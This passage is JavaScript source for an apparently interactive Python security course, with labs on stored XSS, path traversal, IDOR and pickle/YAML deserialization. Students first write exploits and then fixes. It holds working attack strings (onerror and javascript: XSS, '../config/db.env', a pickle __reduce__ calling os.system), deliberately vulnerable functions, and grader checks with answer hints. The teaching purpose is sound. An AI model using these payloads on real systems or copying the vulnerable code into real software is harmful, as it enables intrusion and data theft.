      ex('import html\n\nsite = "javascript:alert(document.cookie)"\nbrowser(f\'<a href="{html.escape(site)}">my site</a>\')') +
      "<p>For URLs, use an <b>allowlist of schemes</b>. <code>urlparse</code> splits a URL into parts:</p>" +
      ex('from urllib.parse import urlparse\n\nfor url in ["https://kestrel.io/u/ana", "javascript:alert(1)", " JavaScript:alert(1)", "data:text/html,hi"]:\n    print(repr(url), "->", repr(urlparse(url.strip()).scheme.lower()))'),
    starter: py`
      # PY-130 · The comments page
      import html
      from urllib.parse import urlparse


      def comment_html(author, text):
          return f'<div class="comment"><b>{author}</b><p>{text}</p></div>'


      def profile_link(name, website):
          return f'<a href="{website}">{name}</a>'


      browser(comment_html("ana", "Great release notes!"))
      browser(profile_link("ana", "https://kestrel.io/u/ana"))

      # 1) Exploit: a comment text that runs JavaScript
      evil_comment = ""

      # 3) Exploit: a website that runs JavaScript EVEN IF the link is escaped with html.escape
      evil_website = ""
    `,
    prelude: FAKE_BROWSER,
    objectives: [
      {
        id: "xss",
        text: "<b>Exploit:</b> set <code>evil_comment</code> so the original <code>comment_html(\"mallory\", evil_comment)</code> runs JavaScript.",
        hints: ["Put a tag in the comment that runs code: a <script> tag, or an <img> with an onerror handler.",
          'evil_comment = "<img src=x onerror=alert(document.cookie)>"'],
        check: BROWSER_CHECK + py`
          def check(ns, out, run, src):
              c = ns.get("evil_comment")
              if not c:
                  return "Set evil_comment to your attack string."
              page = '<div class="comment"><b>mallory</b><p>' + c + '</p></div>'
              if not scripts_in(page):
                  return "The page would be:\n  " + page + "\nand no JavaScript runs. Try browser(comment_html(\"mallory\", evil_comment))."
              return True
        `
      },
      {
        id: "escape",
        text: "<b>Fix</b> <code>comment_html</code>: escape both <code>author</code> and <code>text</code> with <code>html.escape</code>. No attack may run JavaScript, and normal comments still display, e.g. <code>Tom &amp;amp; Jerry &amp;lt;3</code>.",
        hints: ["Escape each value before putting it into the f-string.",
          "def comment_html(author, text):\n    return f'<div class=\"comment\"><b>{html.escape(author)}</b><p>{html.escape(text)}</p></div>'"],
        check: BROWSER_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "comment_html")
              if not f:
                  return "I can't find comment_html."
              ok, got = H.call(f, "ana", "Tom & Jerry <3")
              if not ok or got != '<div class="comment"><b>ana</b><p>Tom &amp; Jerry &lt;3</p></div>':
                  return "comment_html(\"ana\", \"Tom & Jerry <3\") should give:\n  <div class=\"comment\"><b>ana</b><p>Tom &amp; Jerry &lt;3</p></div>\ngot:\n  " + str(got)
              attacks = ["<script>alert(document.cookie)</script>", "<img src=x onerror=alert(1)>", "</p><svg onload=alert(1)>", "<a href=\"javascript:alert(1)\">click</a>"]
              for a in attacks:
                  for args, where in [(("mallory", a), "the comment text"), ((a, "hi"), "the author name")]:
                      ok, page = H.call(f, *args)
                      if ok and scripts_in(page):
                          return "XSS still works through " + where + ": " + repr(a) + "\nproduces " + page + "\nEscape both author and text."
              return True
        `
      },
      {
        id: "jsurl",
        text: "<b>Exploit:</b> set <code>evil_website</code> so that even an <b>escaped</b> link, <code>&lt;a href=\"{html.escape(evil_website)}\"&gt;</code>, runs JavaScript.",
        hints: ["Escaping only changes < > & and quotes. Which kind of URL runs code without needing any of those?", 'evil_website = "javascript:alert(document.cookie)"'],
        check: BROWSER_CHECK + py`
          def check(ns, out, run, src):
              import html
              w = ns.get("evil_website")
              if not w:
                  return "Set evil_website to your attack string."
              page = '<a href="' + html.escape(w) + '">ana</a>'
              if not scripts_in(page):
                  return "Escaped, your link is:\n  " + page + "\nand nothing runs. Escaping stops new tags and broken quotes, so you need a URL that is itself code."
              return True
        `
      },
      {
        id: "links",
        text: "<b>Fix</b> <code>profile_link</code>: escape the name and the URL, and only use the URL if its scheme is <code>http</code> or <code>https</code>; otherwise use <code>#</code>.",
        hints: ["scheme = urlparse(website.strip()).scheme.lower(). If it isn't in (\"http\", \"https\"), set website = \"#\". Then escape both values in the f-string.",
          'def profile_link(name, website):\n    if urlparse(website.strip()).scheme.lower() not in ("http", "https"):\n        website = "#"\n    return f\'<a href="{html.escape(website)}">{html.escape(name)}</a>\''],
        check: BROWSER_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "profile_link")
              if not f:
                  return "I can't find profile_link."
              for args, want in [(("Ana <3", "https://kestrel.io/u/ana"), '<a href="https://kestrel.io/u/ana">Ana &lt;3</a>'),
                                 (("ana", "http://example.com/?a=1&b=2"), '<a href="http://example.com/?a=1&amp;b=2">ana</a>'),
                                 (("ana", "javascript:alert(1)"), '<a href="#">ana</a>')]:
                  ok, got = H.call(f, *args)
                  if not ok or got != want:
                      return "profile_link" + repr(args) + " should give\n  " + want + "\ngot\n  " + (str(got) if ok else type(got).__name__ + ": " + str(got))
              for w in ["javascript:alert(1)", " JaVaScRiPt:alert(1)", "java\tscript:alert(1)", "data:text/html,<script>alert(1)</script>", '" onmouseover="alert(1)', "https://x.io/\" onmouseover=\"alert(1)"]:
                  ok, page = H.call(f, "ana", w)
                  if ok and scripts_in(page):
                      return "XSS still works with website " + repr(w) + ":\n  " + page
              ok, page = H.call(f, "<script>alert(1)</script>", "https://kestrel.io")
              if ok and scripts_in(page):
                  return "Escape the name too: a name of <script>alert(1)</script> still runs."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. A stored XSS on a page that admins visit is one of the most valuable bugs an attacker can find: one comment, and the script acts as every admin who reads it. Escaping every value at output, and allowlisting URL schemes, closes it.</p>" +
      "<p>Same lesson a third time: <b>user data must never be able to become code</b>, whether that code is SQL, shell or JavaScript.</p>",
    realworld: "Template engines like Jinja2 (Flask) and Django's templates escape by default, which is why you should use them instead of f-strings, and why |safe and Markup() deserve a hard look in code review. A Content-Security-Policy header is the second line of defence: it tells the browser not to run inline scripts at all.",
    quiz: [
      { q: "Where should you escape user data?", options: ["When it's saved to the database", "When it's put into HTML (on output)", "Only in comments", "Nowhere, if you validate it"], answer: 1,
        why: "Escaping depends on where the data goes (HTML, attribute, URL, SQL), so do it at the point of output." },
      { q: "Why doesn't <code>html.escape</code> stop <code>javascript:alert(1)</code> in an href?", options: ["It does stop it", "That URL contains no characters that escaping changes", "Browsers ignore escaping", "html.escape only works on text"], answer: 1,
        why: "The URL is dangerous because of its scheme. Check the scheme against an allowlist." },
      { q: "Who runs the attacker's script in a stored XSS?", options: ["The server", "The attacker's browser only", "Every visitor who views the page", "Nobody"], answer: 2,
        why: "The script is saved with the comment and served to everyone, in their logged-in browser." }
    ]
  });

  /* ================================================================== PY-131 */
  var PATH_FILES = {
    "public/handbook.txt": lines("Kestrel Cloud customer handbook", "Support: support@kestrel.io"),
    "public/reports/q3.txt": lines("Q3 uptime: 99.97%"),
    "config/db.env": lines("DB_HOST=db.internal", "DB_PASSWORD=Pr0d-db-2026!"),
    "public-old/notes.txt": lines("OLD - do not publish", "admin portal password: Spring2024!")
  };
  var PATH_CHECK = py`
    from pathlib import Path as _P

    def vuln_download(name):
        return (_P("public") / name).read_text()

    def vuln_download_v2(name):
        base = _P("public")
        path = (base / name).resolve()
        if not str(path).startswith(str(base.resolve())):
            raise PermissionError(name)
        return path.read_text()

    ATTACKS = ["../config/db.env", "reports/../../config/db.env", "../public-old/notes.txt", "../../../../etc/passwd"]
  ` + NL;

  LABS.push({
    id: "py-131", n: 31, module: 4, ticket: "PY-131", xp: 100,
    title: "Download any file",
    topic: "Path traversal",
    from: "Maya Chen · SRE lead",
    story: "<p>The docs site serves files from a <code>public</code> folder: <code>/download?name=handbook.txt</code>. Right next to <code>public</code> on that server sit the <code>config</code> folder with our database password, and an old <code>public-old</code> folder nobody cleaned up.</p>" +
      "<p>Dev already tried a fix. Break both versions, then write one that actually holds.</p>",
    learn:
      '<div class="callout"><b>Files in this lab:</b> <code>public/handbook.txt</code>, <code>public/reports/q3.txt</code>, and outside the public folder <code>config/db.env</code> and <code>public-old/notes.txt</code>.</div>' +
      "<h3>.. means \"one folder up\"</h3><p>Paths can climb out of a folder with <code>..</code>. If a user-supplied name is joined onto a base folder, the user decides where the path really ends up:</p>" +
      ex('from pathlib import Path\n\nbase = Path("public")\nfor name in ["handbook.txt", "reports/q3.txt", "../config/db.env"]:\n    p = base / name\n    print(p, "->", p.resolve())') +
      "<p><code>.resolve()</code> works out the real, absolute location: it applies every <code>..</code> and follows links. That's <b>path traversal</b>: <code>public/../config/db.env</code> is really <code>config/db.env</code>.</p>" +
      "<p>Also note: joining an <b>absolute</b> path throws the base away completely:</p>" +
      ex('from pathlib import Path\n\nprint(Path("public") / "/etc/passwd")') +
      "<h3>Checking the real location</h3><p>The fix is to resolve the path and then check it is <b>inside</b> the base folder. Comparing strings with <code>startswith</code> looks right but isn't: is <code>/srv/public-old</code> inside <code>/srv/public</code>? As text, it starts with it. Ask pathlib instead, which compares whole folder names:</p>" +
      ex('from pathlib import Path\n\nbase = Path("public").resolve()\nfor name in ["reports/q3.txt", "../config/db.env", "../public-old/notes.txt"]:\n    p = (base / name).resolve()\n    print(name, "| startswith:", str(p).startswith(str(base)), "| is_relative_to:", p.is_relative_to(base))') +
      "<p>When the check fails, refuse with <code>raise PermissionError(...)</code>. Put the check in one helper and use it for <b>every</b> file operation, reading and writing.</p>",
    starter: py`
      # PY-131 · Download any file
      from pathlib import Path

      BASE = Path("public")


      def download(name):
          """Serve a file from the public folder: /download?name=handbook.txt"""
          return (BASE / name).read_text()


      def download_v2(name):
          """Dev's first fix: check that the path starts with the public folder."""
          path = (BASE / name).resolve()
          if not str(path).startswith(str(BASE.resolve())):
              raise PermissionError(name)
          return path.read_text()


      print(download("handbook.txt"))

      # 1) Exploit download(): read config/db.env
      evil_name = ""

      # 2) Exploit download_v2(): read public-old/notes.txt
      evil_name2 = ""

      # 3) Fix: safe_path(name), and download() using it
      # 4) upload(name, text) using safe_path too
    `,
    files: PATH_FILES,
    removeFiles: ["public/notes.txt", "public/uploads/new.txt"],
    objectives: [
      {
        id: "traverse",
        text: "<b>Exploit:</b> set <code>evil_name</code> so the original <code>download(evil_name)</code> returns the contents of <code>config/db.env</code>.",
        hints: ["Go up one folder from public with ../ and then into config.", 'evil_name = "../config/db.env"'],
        check: PATH_CHECK + py`
          def check(ns, out, run, src):
              n = ns.get("evil_name")
              if not n:
                  return "Set evil_name to your attack string."
              ok, got = H.call(vuln_download, n)
              if not ok or "DB_PASSWORD" not in got:
                  return "download(" + repr(n) + ") looked for " + str(_P("public") / n) + " and " + ("raised " + type(got).__name__ if not ok else "returned " + H.short(got)) + ". Aim it at config/db.env."
              return True
        `
      },
      {
        id: "prefix",
        text: "<b>Exploit:</b> set <code>evil_name2</code> so Dev's <code>download_v2(evil_name2)</code> returns <code>public-old/notes.txt</code>, getting past its <code>startswith</code> check.",
        hints: ["Resolve it in your head: public/../public-old/notes.txt. Does that string start with the public folder's path?", 'evil_name2 = "../public-old/notes.txt"'],
        check: PATH_CHECK + py`
          def check(ns, out, run, src):
              n = ns.get("evil_name2")
              if not n:
                  return "Set evil_name2 to your attack string."
              ok, got = H.call(vuln_download_v2, n)
              if not ok or "admin portal password" not in got:
                  return "download_v2(" + repr(n) + ") " + ("refused it (" + type(got).__name__ + ")" if not ok else "returned " + H.short(got)) + ". Look at the folder names: which one starts with the text \"public\"?"
              return True
        `
      },
      {
        id: "safe",
        text: "<b>Fix:</b> write <code>safe_path(name)</code> that returns the resolved path if it's inside <code>BASE</code> (use <code>is_relative_to</code>) and raises <code>PermissionError</code> otherwise. Make <code>download</code> use it.",
        hints: ["base = BASE.resolve(); path = (base / name).resolve(); if not path.is_relative_to(base): raise PermissionError(...); return path.",
          'def safe_path(name):\n    base = BASE.resolve()\n    path = (base / name).resolve()\n    if not path.is_relative_to(base):\n        raise PermissionError(f"{name!r} is outside the public folder")\n    return path\n\n\ndef download(name):\n    return safe_path(name).read_text()'],
        check: PATH_CHECK + py`
          def check(ns, out, run, src):
              sp, dl = H.fn(ns, "safe_path"), H.fn(ns, "download")
              if not sp:
                  return "I can't find a function called safe_path."
              base = _P("public").resolve()
              for good in ["handbook.txt", "reports/q3.txt", "reports/../handbook.txt"]:
                  ok, got = H.call(sp, good)
                  if not ok:
                      return "safe_path(" + repr(good) + ") should be allowed, but raised " + type(got).__name__ + ": " + str(got)
                  if _P(got).resolve() != (base / good).resolve():
                      return "safe_path(" + repr(good) + ") should return the resolved path inside public, got " + H.short(got) + "."
              for bad in ATTACKS + [str(_P("config/db.env").resolve()), "/etc/passwd"]:
                  ok, got = H.call(sp, bad)
                  if ok:
                      return "safe_path(" + repr(bad) + ") allowed it (" + str(got) + "). Resolve the path and check is_relative_to(BASE.resolve())."
                  if not isinstance(got, PermissionError):
                      return "safe_path(" + repr(bad) + ") raised " + type(got).__name__ + "; raise PermissionError instead."
              ok, got = H.call(dl, "handbook.txt")
              if not ok or "customer handbook" not in got:
                  return "download(\"handbook.txt\") should still work."
              for bad in ATTACKS:
                  ok, got = H.call(dl, bad)
                  if ok:
                      return "download(" + repr(bad) + ") still returns the file. Make download use safe_path."
              return True
        `
      },
      {
        id: "upload",
        text: "<b>Fix:</b> write <code>upload(name, text)</code> that saves text to a file in <code>public</code> through <code>safe_path</code>, creating sub-folders if needed, and refuses names outside it.",
        hints: ["path = safe_path(name); path.parent.mkdir(parents=True, exist_ok=True); path.write_text(text).",
          "def upload(name, text):\n    path = safe_path(name)\n    path.parent.mkdir(parents=True, exist_ok=True)\n    path.write_text(text)"],
        check: PATH_CHECK + py`
          def check(ns, out, run, src):
              import os
              up = H.fn(ns, "upload")
              if not up:
                  return "I can't find a function called upload."
              ok, got = H.call(up, "notes.txt", "hello")
              if not ok or not os.path.exists("public/notes.txt") or open("public/notes.txt").read() != "hello":
                  return "upload(\"notes.txt\", \"hello\") should write public/notes.txt" + ("" if ok else " (it raised " + type(got).__name__ + ": " + str(got) + ")") + "."
              ok, got = H.call(up, "uploads/new.txt", "x")
              if not ok or not os.path.exists("public/uploads/new.txt"):
                  return "upload(\"uploads/new.txt\", \"x\") should create the uploads folder inside public. path.parent.mkdir(parents=True, exist_ok=True)."
              before = open("config/db.env").read()
              ok, got = H.call(up, "../config/db.env", "DB_PASSWORD=hacked\n")
              after = open("config/db.env").read()
              if after != before:
                  with open("config/db.env", "w") as fh:
                      fh.write(before)
                  return "upload(\"../config/db.env\", ...) overwrote the real config file! Use safe_path before writing."
              if ok or not isinstance(got, PermissionError):
                  return "upload(\"../config/db.env\", ...) should raise PermissionError."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. The first version leaked the production database password; Dev's fix stopped <code>../config</code> but still leaked <code>public-old</code>, because it compared <b>text</b> instead of <b>paths</b>. That near-miss fix is extremely common, which is why reviewers look twice at <code>startswith</code> on paths.</p>" +
      "<p>The general rule: <b>resolve first, then check, then use</b>, in one helper that every file operation goes through.</p>",
    realworld: "Path traversal (CWE-22) shows up in file downloads, uploads, archive extraction (\"zip slip\": a zip entry named ../../app.py) and template loaders. Python 3.12 added a filter= argument to tarfile.extractall for exactly this reason. Even better than checking: don't use user input as a path at all, and look files up by an ID in a database.",
    quiz: [
      { q: "What does <code>Path(\"public\") / \"../config/db.env\"</code> resolve to?", options: ["public/config/db.env", "config/db.env", "An error", "public/db.env"], answer: 1,
        why: ".. climbs out of public, so the real file is config/db.env." },
      { q: "Why does the <code>startswith</code> check fail for <code>public-old</code>?", options: ["It doesn't fail", "As text, \".../public-old/notes.txt\" starts with \".../public\"", "resolve() is broken", "The file doesn't exist"], answer: 1,
        why: "Compare whole path components with is_relative_to, not string prefixes." },
      { q: "In what order should file access be checked?", options: ["Use, then check", "Check the raw name for \"..\", then use", "Resolve, then check it's inside the base, then use", "Only check uploads"], answer: 2,
        why: "Checking the raw text misses tricks like absolute paths. Resolve first, so you check where it really goes." }
    ]
  });

  /* ================================================================== PY-132 */
  var IDOR_DATA = py`
    USERS = {"ana": "customer", "ben": "customer", "maya": "support", "root": "admin"}
    INVOICES = {
        "INV-1001": {"owner": "ana", "amount": 49.00, "status": "paid"},
        "INV-1002": {"owner": "ben", "amount": 19.00, "status": "paid"},
        "INV-1003": {"owner": "ana", "amount": 120.00, "status": "unpaid"},
        "INV-1004": {"owner": "carla", "amount": 980.00, "status": "paid"},
        "INV-1005": {"owner": "ben", "amount": 19.00, "status": "refunded"},
    }
  `;
  var IDOR_CHECK = py`
    def denied(f, *args):
        ok, got = H.call(f, *args)
        if ok:
            return "allowed"
        if not isinstance(got, PermissionError):
            return "raised " + type(got).__name__ + " instead of PermissionError"
        return None
  ` + NL;

  LABS.push({
    id: "py-132", n: 32, module: 4, ticket: "PY-132", xp: 100,
    title: "Other people's invoices",
    topic: "Broken access control (IDOR)",
    from: "Dev Patel · Security",
    story: "<p>A customer emailed support: \"I changed the number at the end of the invoice URL and saw someone else's bill.\" They were right. The billing API checks that you're <b>logged in</b>, but never checks that the invoice is <b>yours</b>.</p>" +
      "<p>That's the most common serious bug on the web. Measure how bad it is, then write the permission checks that should have been there.</p>",
    learn:
      "<h3>Authentication vs authorization</h3>" +
      '<table class="t"><tr><th></th><th>Question</th><th>Example</th></tr>' +
      "<tr><td><b>Authentication</b></td><td>Who are you?</td><td>password, MFA, session cookie</td></tr>" +
      "<tr><td><b>Authorization</b></td><td>Are <em>you</em> allowed to do <em>this</em> to <em>this thing</em>?</td><td>owner check, roles</td></tr></table>" +
      "<p>Broken access control means the second question is missing or wrong. It's <b>#1 in the OWASP Top 10</b>. The classic form is an <b>IDOR</b> (insecure direct object reference): the app takes an ID from the request and fetches that object without checking who's asking.</p>" +
      ex('INVOICES = {"INV-1001": {"owner": "ana"}, "INV-1002": {"owner": "ben"}}\n\ndef get_invoice(user, invoice_id):\n    return INVOICES[invoice_id]          # never looks at user\n\nprint(get_invoice("ben", "INV-1001"))  # ben reads ana\'s invoice') +
      "<p>Sequential IDs make it worse: an attacker just counts upwards.</p>" +
      "<h3>One policy function, deny by default</h3><p>Don't sprinkle <code>if</code>s through every endpoint; one forgotten check is a breach. Put the rules in <b>one</b> function that every endpoint calls, and make it return <code>False</code> unless a rule explicitly allows the action:</p>" +
      ex('ROLES = {"ana": "customer", "maya": "support"}\n\ndef can(user, action, doc):\n    role = ROLES.get(user)\n    if role is None:\n        return False                      # unknown user\n    if action == "read":\n        return doc["owner"] == user or role == "support"\n    return False                          # unknown action: deny\n\nprint(can("ana", "read", {"owner": "ana"}), can("ana", "read", {"owner": "ben"}), can("ana", "delete", {"owner": "ana"}))') +
      "<h3>Don't reveal what exists</h3><p>If <code>INV-1004</code> says \"forbidden\" but <code>INV-9999</code> says \"not found\", an attacker learns which invoices exist. Give the same answer for both: here, <code>PermissionError</code>.</p>",
    starter: py`
      # PY-132 · Other people's invoices
      ` + "\n" + IDOR_DATA + NL + py`
      def old_get_invoice(user, invoice_id):
          """The version in production today (leave this one as it is: it's the target)."""
          return INVOICES[invoice_id]


      # 1) Exploit: logged in as "ben", try INV-1000 to INV-1010 with old_get_invoice
      #    (missing ids raise KeyError) and collect the ids of invoices that aren't ben's
      leaked = []


      def can(user, action, invoice):
          pass


      def get_invoice(user, invoice_id):
          """GET /invoices/<invoice_id>"""
          return INVOICES[invoice_id]


      def refund(user, invoice_id):
          """POST /invoices/<invoice_id>/refund"""
          INVOICES[invoice_id]["status"] = "refunded"
          return INVOICES[invoice_id]
    `,
    objectives: [
      {
        id: "enumerate",
        text: "<b>Exploit:</b> logged in as <code>ben</code>, loop over <code>INV-1000</code> to <code>INV-1010</code> calling <code>old_get_invoice</code>, and set <code>leaked</code> to the ids of invoices that aren't ben's.",
        hints: ['Build each id with f"INV-{n}" for n in range(1000, 1011). Wrap the call in try/except KeyError for ids that don\'t exist.',
          'leaked = []\nfor n in range(1000, 1011):\n    invoice_id = f"INV-{n}"\n    try:\n        inv = old_get_invoice("ben", invoice_id)\n    except KeyError:\n        continue\n    if inv["owner"] != "ben":\n        leaked.append(invoice_id)'],
        check: py`
          def check(ns, out, run, src):
              r = H.expect(ns, "leaked", ["INV-1001", "INV-1003", "INV-1004"], list)
              if r is not True:
                  return r
              if src.count("old_get_invoice(") < 2:
                  return "Collect leaked by calling old_get_invoice in a loop, the way an attacker would."
              return True
        `
      },
      {
        id: "policy",
        text: "Write <code>can(user, action, invoice)</code>. <code>\"read\"</code>: the owner, or anyone whose role is <code>support</code> or <code>admin</code>. <code>\"refund\"</code>: only <code>support</code>/<code>admin</code>, and only if the status is <code>paid</code>. Unknown users and unknown actions: <code>False</code>.",
        hints: ["role = USERS.get(user). If role is None return False. Then one if per action, and return False at the end for anything else.",
          'def can(user, action, invoice):\n    role = USERS.get(user)\n    if role is None:\n        return False\n    staff = role in ("support", "admin")\n    if action == "read":\n        return invoice["owner"] == user or staff\n    if action == "refund":\n        return staff and invoice["status"] == "paid"\n    return False'],
        check: py`
          def check(ns, out, run, src):
              f = H.fn(ns, "can")
              if not f:
                  return "I can't find a function called can."
              mine = {"owner": "ana", "amount": 1, "status": "paid"}
              other = {"owner": "carla", "amount": 1, "status": "paid"}
              unpaid = {"owner": "ana", "amount": 1, "status": "unpaid"}
              cases = [("ana", "read", mine, True), ("ben", "read", mine, False), ("maya", "read", other, True), ("root", "read", other, True),
                       ("mallory", "read", other, False), ("carla", "read", other, False),
                       ("ana", "refund", mine, False), ("maya", "refund", mine, True), ("root", "refund", other, True), ("maya", "refund", unpaid, False),
                       ("root", "delete", mine, False), ("ana", "delete", mine, False), ("maya", "", mine, False)]
              for user, action, inv, want in cases:
                  ok, got = H.call(f, user, action, inv)
                  if not ok:
                      return "can(" + repr(user) + ", " + repr(action) + ", ...) crashed: " + type(got).__name__ + ": " + str(got)
                  if got is not want:
                      who = "the owner" if inv["owner"] == user else "not the owner"
                      return "can(" + repr(user) + ", " + repr(action) + ", " + inv["status"] + " invoice, " + who + ") should be " + str(want) + ", got " + H.short(got) + "."
              return True
        `
      },
      {
        id: "read",
        text: "<b>Fix</b> <code>get_invoice</code>: return the invoice only if <code>can(user, \"read\", invoice)</code>. Otherwise, <b>and for ids that don't exist</b>, raise <code>PermissionError</code>.",
        hints: ["invoice = INVOICES.get(invoice_id). If invoice is None or not can(...): raise PermissionError(\"invoice not found\").",
          'def get_invoice(user, invoice_id):\n    invoice = INVOICES.get(invoice_id)\n    if invoice is None or not can(user, "read", invoice):\n        raise PermissionError("invoice not found")\n    return invoice'],
        check: IDOR_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "get_invoice")
              if not f:
                  return "I can't find get_invoice."
              for user, inv in [("ana", "INV-1001"), ("ben", "INV-1002"), ("maya", "INV-1004"), ("root", "INV-1003")]:
                  ok, got = H.call(f, user, inv)
                  if not ok or not isinstance(got, dict):
                      return "get_invoice(" + repr(user) + ", " + repr(inv) + ") should return the invoice, but " + (type(got).__name__ + ": " + str(got) if not ok else "returned " + H.short(got)) + "."
              for user, inv in [("ben", "INV-1001"), ("ben", "INV-1004"), ("ana", "INV-1002"), ("mallory", "INV-1001")]:
                  why = denied(f, user, inv)
                  if why:
                      return "get_invoice(" + repr(user) + ", " + repr(inv) + ") " + why + ". Check can(user, \"read\", invoice)."
              why = denied(f, "ben", "INV-9999")
              if why:
                  return "get_invoice(\"ben\", \"INV-9999\") " + why + ". A missing invoice should look exactly like a forbidden one: PermissionError."
              return True
        `
      },
      {
        id: "refund",
        text: "<b>Fix</b> <code>refund</code>: only when <code>can(user, \"refund\", invoice)</code>; otherwise (and for unknown ids) raise <code>PermissionError</code> without changing anything.",
        hints: ["Same shape as get_invoice, with the \"refund\" action. Only set the status after the check passes.",
          'def refund(user, invoice_id):\n    invoice = INVOICES.get(invoice_id)\n    if invoice is None or not can(user, "refund", invoice):\n        raise PermissionError("not allowed")\n    invoice["status"] = "refunded"\n    return invoice'],
        check: IDOR_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "refund")
              inv = ns.get("INVOICES")
              if not f or not isinstance(inv, dict):
                  return "I can't find refund and INVOICES."
              before = {k: dict(v) for k, v in inv.items()}
              for user, i, why_text in [("ben", "INV-1002", "a customer refunding his own invoice"), ("ana", "INV-1004", "a customer refunding someone else's"),
                                         ("maya", "INV-1003", "an unpaid invoice"), ("maya", "INV-1005", "an already refunded invoice"),
                                         ("mallory", "INV-1001", "an unknown user"), ("root", "INV-9999", "an invoice that doesn't exist")]:
                  why = denied(f, user, i)
                  if why:
                      return "refund(" + repr(user) + ", " + repr(i) + ") (" + why_text + ") " + why + "."
              if {k: dict(v) for k, v in inv.items()} != before:
                  return "A refused refund still changed an invoice. Check permission before changing anything."
              ok, got = H.call(f, "maya", "INV-1002")
              if not ok or inv["INV-1002"]["status"] != "refunded":
                  return "refund(\"maya\", \"INV-1002\") (support, paid invoice) should work and set the status to refunded."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. Any customer could read every invoice, including a $980 one belonging to a deleted account, just by counting. Now every request goes through <b>one</b> policy function that denies by default, and a missing invoice looks exactly like someone else's.</p>" +
      "<p>Notice that none of the other labs' defences (escaping, parameters, validation) would have caught this: the requests were perfectly well-formed. Access control has to be <b>designed</b>, and then tested with a matrix of who-can-do-what, like the checks did.</p>",
    realworld: "Access-control bugs are the most common finding in bug bounty programs and pen tests. Real apps enforce them in one place: a decorator, middleware or policy engine (e.g. Open Policy Agent). Random IDs (UUIDs) make guessing harder, but they're not a substitute for the owner check.",
    quiz: [
      { q: "The API checks you're logged in but not that the invoice is yours. Which part is missing?", options: ["Authentication", "Authorization", "Encryption", "Input validation"], answer: 1,
        why: "Authentication = who you are. Authorization = what you may do to which object." },
      { q: "What should <code>can()</code> return for an action it has no rule for?", options: ["True", "False: deny by default", "An error", "Whatever the role allows"], answer: 1,
        why: "Allow lists fail safe. If someone adds a new action and forgets a rule, it's denied rather than open." },
      { q: "Why raise the same error for \"doesn't exist\" and \"not yours\"?", options: ["Less code", "So attackers can't learn which IDs exist", "HTTP requires it", "It's faster"], answer: 1,
        why: "Different answers leak information an attacker can use to map your data." }
    ]
  });

  /* ================================================================== PY-133 */
  var DESER_CHECK = SHELL_CHECK + py`
    import pickle as _pk, base64 as _b64

    def vuln_load(cookie):
        return _pk.loads(_b64.b64decode(cookie))

    def vuln_config(text):
        import yaml
        return yaml.load(text, Loader=yaml.UnsafeLoader)

    def evil_pickle_cookie():
        import os
        class E:
            def __reduce__(self):
                return (os.system, ("id",))
        return _b64.b64encode(_pk.dumps(E())).decode()
  ` + NL;

  LABS.push({
    id: "py-133", n: 33, module: 4, ticket: "PY-133", xp: 100,
    title: "The session cookie",
    topic: "Insecure deserialization & signing",
    from: "Dev Patel · Security",
    story: "<p>The admin dashboard keeps your session (user name and role) in a cookie: a Python object, pickled and base64-encoded. The browser sends it back with every request, and the server unpickles it. The deploy tool reads its config with <code>yaml.load</code>.</p>" +
      "<p>The browser belongs to the user, so the cookie is <b>attacker-controlled input</b>. Show what that means, then switch to signed JSON.</p>",
    learn:
      '<div class="callout">This lab uses the pretend shell from PY-129 (commands print as <code>+ command</code>) and downloads PyYAML on first use.</div>' +
      "<h3>pickle runs code by design</h3><p><code>pickle</code> can save almost any Python object, because a pickle is really a small program that <b>rebuilds</b> the object, and it may call functions to do so. An object decides how it's rebuilt with <code>__reduce__</code>, which returns a function and its arguments:</p>" +
      ex('import os\nimport pickle\n\nclass Demo:\n    def __reduce__(self):\n        return (os.system, ("echo I ran while unpickling",))\n\ndata = pickle.dumps(Demo())\nprint(data[:40], "...")\npickle.loads(data)') +
      "<p>So <code>pickle.loads(untrusted)</code> lets whoever made the data run any function they like. The Python docs say it plainly: never unpickle data you don't trust. The same goes for <code>yaml.load</code> with an unsafe loader, which understands tags like <code>!!python/object/apply:os.system</code>.</p>" +
      "<h3>The fix: data formats that can't run code</h3><p>JSON can only hold plain data (dicts, lists, strings, numbers, booleans, null), so loading it never runs anything. For YAML, <code>yaml.safe_load</code> does the same.</p>" +
      "<h3>But the user can still edit it</h3><p>A JSON cookie can't run code, but the user can still change <code>\"role\": \"customer\"</code> to <code>\"admin\"</code>. So <b>sign</b> it: add an HMAC, a hash of the data mixed with a secret key only the server knows. Change one character and the signature no longer matches.</p>" +
      ex('import hashlib\nimport hmac\n\nKEY = b"server-secret"\npayload = b\'{"user": "ana", "role": "customer"}\'\nsig = hmac.new(KEY, payload, hashlib.sha256).hexdigest()\nprint(sig)\n\nforged = b\'{"user": "ana", "role": "admin"}\'\nprint(hmac.new(KEY, forged, hashlib.sha256).hexdigest() == sig)') +
      "<p>Compare signatures with <code>hmac.compare_digest(a, b)</code>, not <code>==</code>. <code>==</code> stops at the first different character, and the timing difference can leak the correct signature one character at a time.</p>" +
      "<p>Cookies must be plain text, so encode the JSON with <code>base64.urlsafe_b64encode</code> and join it to the signature with a dot: <code>payload.signature</code>.</p>",
    starter: py`
      # PY-133 · The session cookie
      import base64
      import hashlib
      import hmac
      import json
      import os
      import pickle

      import yaml

      SECRET_KEY = b"kestrel-lab-signing-key"   # in production: from an environment variable


      def save_session(session):
          """Turn the session dict into a cookie string."""
          return base64.b64encode(pickle.dumps(session)).decode()


      def load_session(cookie):
          """Read the session back from the cookie the browser sent."""
          return pickle.loads(base64.b64decode(cookie))


      def load_config(text):
          return yaml.load(text, Loader=yaml.UnsafeLoader)


      cookie = save_session({"user": "ana", "role": "customer"})
      print(cookie)
      print(load_session(cookie))

      # 1) Exploit: a cookie that makes the original load_session run a shell command
      evil_cookie = ""

      # 2) Exploit: YAML that makes the original load_config run a shell command
      evil_yaml = ""
    `,
    prelude: FAKE_SHELL,
    objectives: [
      {
        id: "pickle",
        text: "<b>Exploit:</b> set <code>evil_cookie</code> so the original <code>load_session(evil_cookie)</code> runs a shell command through <code>os.system</code>.",
        hints: ["Make a class whose __reduce__ returns (os.system, (\"whoami\",)), pickle an instance, and base64-encode it the same way save_session does.",
